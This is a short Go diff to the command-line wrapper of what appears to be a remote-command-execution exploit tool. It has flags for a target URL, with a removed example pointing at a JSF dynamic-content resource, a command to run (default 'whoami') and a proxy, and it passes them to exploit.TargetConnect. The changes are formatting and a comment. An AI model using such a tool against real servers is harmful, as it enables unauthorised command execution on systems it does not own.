@@ -25,7 +25,7 @@ func main() {
 	ui.GetBanner()
 
 	var opts struct {
-		Url string `short:"u" long:"url" description:"Definition: Argument used to pass target URL (ex: http://127.0.0.1:8090/javax.faces.resource/dynamiccontent.properties.xhtml)" required:"false"`
+		Url string `short:"u" long:"url" description:"Definition: Argument used to pass target URL (ex: http://127.0.0.1:8090)" required:"false"`
 		Cmd string `short:"c" long:"cmd" description:"Definition: Argument used to pass the command" required:"false" default:"whoami"`
 		Proxy string `short:"p" long:"proxy" description:"Definition: Argument used to pass proxy (SOCKS4, SOCKS4a, SOCKS5 or HTTP)" required:"false"`
 	}
@@ -56,7 +56,14 @@ func main() {
     		fmt.Println("[!] the required flag `-u, --url' was not specified")
     		os.Exit(0)
     	}
+
+		// Check if the last character is a / or not
 		check_slash  := opts.Url[len(opts.Url)-1:]
-		if check_slash == "/" { exploit.TargetConnect(opts.Url, opts.Cmd, opts.Proxy, false) } else if check_slash != "/" { exploit.TargetConnect(opts.Url + "/", opts.Cmd, opts.Proxy, false) }
+		if check_slash == "/" { 
+			exploit.TargetConnect(opts.Url, opts.Cmd, opts.Proxy, false) 
+		} else if check_slash != "/" { 
+			exploit.TargetConnect(opts.Url + "/", opts.Cmd, opts.Proxy, false) 
+		}
+
     }
 }
